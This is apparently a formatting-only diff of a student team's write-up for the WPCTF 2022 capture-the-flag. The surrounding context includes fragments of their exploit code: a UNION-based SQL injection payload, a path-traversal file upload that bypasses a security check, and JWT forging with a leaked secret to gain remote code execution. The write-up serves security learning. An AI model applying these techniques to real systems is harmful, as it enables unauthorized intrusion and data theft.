@@ -3,6 +3,7 @@
 Confused about the exploit code? Checkout the exploit [here](./expl.py)!
 
 (Or if you want to try the CTF, see the files [here](https://github.com/WuerthPhoenix/wpctf2022)!)
+
 ## Reconnaissance: WP{h1d3_http_h34d3rz}
 
 For the first flag simply connect to your instance and look at the headers the server responds with, you should see a custom header called `Wp-Ctf` with the flag.
@@ -120,7 +121,7 @@ It was now time to dump the entire database. First we need to know what tables t
 # No, we are not sorry for the CTF quality code.
 def injection(inj):
     r = c.get_username("admin238\\'", f"OR 1=1 UNION SELECT 1337,9001,({inj}),420,69,42 --")
-    j = json.loads(r) 
+    j = json.loads(r)
     j = j['user'][3]['pass']
     l = j.split(",")
     l = [" ".join(x.split("1337")) for x in l]
@@ -154,18 +155,17 @@ STRICT_TRANS_TABLES,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUB
 Then we looked at the [documentation](https://mariadb.com/kb/en/sql-mode/).
 
 > ## Strict Mode
-> 
-> A mode where at least one of `STRICT_TRANS_TABLES` or `STRICT_ALL_TABLES` is enabled is called *strict mode*.
-> 
+>
+> A mode where at least one of `STRICT_TRANS_TABLES` or `STRICT_ALL_TABLES` is enabled is called _strict mode_.
+>
 > With strict mode set (default from [MariaDB 10.2.4](https://mariadb.com/kb/en/mariadb-1024-release-notes/)), statements that modify tables (either transactional for `STRICT_TRANS_TABLES` or all for `STRICT_ALL_TABLES`)
->  will fail, and an error will be returned instead. The IGNORE keyword 
+> will fail, and an error will be returned instead. The IGNORE keyword
 > can be used when strict mode is set to convert the error to a warning.
-> 
+>
 > With strict mode not set (default in version <= [MariaDB 10.2.3](https://mariadb.com/kb/en/mariadb-1023-release-notes/)),
->  MariaDB will automatically adjust invalid values, for example, 
-> truncating strings that are too long, or adjusting numeric values that 
+> MariaDB will automatically adjust invalid values, for example,
+> truncating strings that are too long, or adjusting numeric values that
 > are out of range, and produce a warning.
-> 
 
 In the database there is a files table, and it stores information such as the path of the uploaded files.
 
@@ -194,7 +194,7 @@ Content-Disposition: form-data; name="group_id"
 -----------------------------31269189394158100819104461333--
 ```
 
- This is the response the server gives when we upload files
+This is the response the server gives when we upload files
 
 ```json
 {
@@ -232,7 +232,7 @@ def write_file(self, path):
     c_path = pad + back + path
     # add writable path to bypass security check
     full_path = f"{c_path}../../../../../../../var/www/html/uploads/13455/prova"
-    
+
 
     response = self.s.post(
         _(path="/api/fileupload.php"),
@@ -280,7 +280,7 @@ header('Wp-Ctf-Team-Name: ' . TEAM_NAME);
 set_include_path(get_include_path() . PATH_SEPARATOR . dirname(getcwd()).'lib/');
 ```
 
-We have the secret used to sign jwt tokens, we can now sign our own cookies! But how is this useful? 
+We have the secret used to sign jwt tokens, we can now sign our own cookies! But how is this useful?
 
 ### Jay-Woo-Tee - WP{3v3n_jwt_c0nt3nt_c4n_b3_d4nger0us}
 
@@ -335,7 +335,7 @@ def rce(self, cmd):
         },
     }
     jwt_asfd = jwt.encode(payload_jwt, JWT_SECRET, algorithm="HS256")
-    
+
     self.s.headers.update({"Authorization": "Bearer " + jwt_asfd.decode()})
     self.s.get(_(path="/api/filesdownloadall.php"))
 
@@ -352,7 +352,7 @@ Thanks to Würth Phoenix & Sponsors for organizing such a fun and challenging CT
 
 ### Who are we?
 
-We are Cyberspeck (🤖🥩), a team of students passionate about security. 
+We are Cyberspeck (🤖🥩), a team of students passionate about security.
 
 - Ivan Valentini (UniTN) - [https://www.linkedin.com/in/ivan-valentini-ab40a8244](https://www.linkedin.com/in/ivan-valentini-ab40a8244?lipi=urn%3Ali%3Apage%3Ad_flagship3_detail_base%3BRJmCKmgHQ1ilF67ku9xFPQ%3D%3D)
 - Alessandro Mizzaro (UniTN) - [https://www.linkedin.com/in/alemmi](https://www.linkedin.com/in/alemmi?miniProfileUrn=urn%3Ali%3Afs_miniProfile%3AACoAACmpMHYBEqWIhGcIQ0H7ggsHYFyRq-GeVTw&lipi=urn%3Ali%3Apage%3Ad_flagship3_detail_base%3BRJmCKmgHQ1ilF67ku9xFPQ%3D%3D)
